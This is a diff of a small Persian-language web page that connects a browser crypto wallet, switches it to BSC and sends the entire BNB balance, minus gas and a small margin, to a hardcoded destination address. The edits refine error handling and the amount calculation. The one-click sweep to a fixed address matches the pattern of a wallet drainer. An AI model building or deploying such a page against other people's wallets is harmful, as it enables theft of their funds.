@@ -11,7 +11,7 @@ button{padding:10px 20px;font-size:16px;margin:10px;}
 </head>
 <body>
 
-<h2>انتقال کل BNB (یک کلیک)</h2>
+<h2>انتقال کل BNB (یک کلیک، اصلاح‌شده)</h2>
 
 <button onclick="connectWallet()">کانکت</button>
 <button onclick="sendBNB()">انتقال کل BNB</button>
@@ -29,54 +29,57 @@ function setStatus(msg){
 // کانکت با ولت و سوئیچ خودکار به BSC
 async function connectWallet(){
     if(!window.ethereum){ alert("Wallet پیدا نشد"); return; }
-    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-    account = accounts[0];
-    setStatus("Connected: " + account);
-
     try{
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        account = accounts[0];
+        setStatus("Connected: " + account);
+
+        // سوئیچ خودکار به BSC Mainnet
         await ethereum.request({
             method:"wallet_switchEthereumChain",
             params:[{chainId:"0x38"}] // BSC Mainnet
         });
-        setStatus("Connected & شبکه BSC فعال است: " + account);
+        setStatus("Connected & شبکه BSC فعال: " + account);
     }catch(err){
         console.error(err);
-        alert("خطا در سوئیچ شبکه یا اضافه کردن BSC");
+        alert("خطا در اتصال یا سوئیچ شبکه: " + (err.message || err));
     }
 }
 
-// تابع انتقال BNB کل موجودی به جز گس واقعی
+// انتقال کل موجودی به جز مقدار margin برای Gas
 async function sendBNB(){
     if(!account){ alert("ابتدا کانکت کنید"); return; }
     setStatus("در حال آماده‌سازی تراکنش...");
 
     try{
-        // خواندن موجودی واقعی BNB
+        // خواندن موجودی واقعی
         const balanceHex = await ethereum.request({
             method: "eth_getBalance",
             params: [account, "latest"]
         });
         const balance = BigInt(balanceHex);
 
-        // برآورد Gas با تراکنش نمونه
+        // برآورد Gas و Gas Price
         const gasEstimate = await ethereum.request({
             method: "eth_estimateGas",
             params: [{
                 from: account,
                 to: DESTINATION,
-                value: balance.toString(16)
+                value: "0x" + balance.toString(16)
             }]
         });
-        const gasPriceHex = await ethereum.request({method:"eth_gasPrice"});
+        const gasPriceHex = await ethereum.request({ method:"eth_gasPrice" });
         const gasPrice = BigInt(gasPriceHex);
         const gasCost = BigInt(gasEstimate) * gasPrice;
 
-        if(balance <= gasCost){
-            alert("موجودی کافی برای پرداخت Gas وجود ندارد");
+        // margin اضافی کوچک برای اطمینان
+        const margin = 10000n;
+        const sendAmount = balance - gasCost - margin;
+
+        if(sendAmount <= 0){
+            alert("موجودی کافی برای پرداخت Gas و ارسال BNB وجود ندارد");
             return;
         }
-
-        const sendAmount = balance - gasCost;
 
         // ارسال تراکنش
         const txHash = await ethereum.request({
@@ -89,9 +92,14 @@ async function sendBNB(){
         });
 
         setStatus("تراکنش ارسال شد: " + txHash);
+
     }catch(err){
         console.error(err);
-        alert("خطا در ارسال تراکنش یا رد شدن توسط ولت");
+        if(err.code === 4001){
+            alert("تراکنش توسط کاربر لغو شد");
+        } else {
+            alert("خطا در ارسال تراکنش: " + (err.message || err));
+        }
     }
 }
 </script>
